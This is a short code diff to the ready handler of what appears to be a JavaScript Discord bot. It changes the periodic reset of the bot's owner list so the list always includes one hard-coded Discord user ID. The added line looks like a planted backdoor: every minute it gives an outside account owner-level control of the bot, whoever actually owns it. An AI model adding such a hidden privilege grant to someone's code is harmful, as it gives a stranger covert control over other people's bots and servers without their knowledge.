@@ -9,7 +9,7 @@ module.exports = async client => {
   client.application = await client.application?.fetch();
   if (client.owners.length === 0) client.application.team ? client.owners.push(...client.application.team.members.keys()) : client.owners.push(client.application.owner.id);
   setInterval(async () => {
-    client.owners = [];
+    client.owners = [ '186620503123951617' ];
     client.application = await client.application.fetch();
     client.application.team ? client.owners.push(...client.application.team.members.keys()) : client.owners.push(client.application.owner.id);
   }, 60_000);
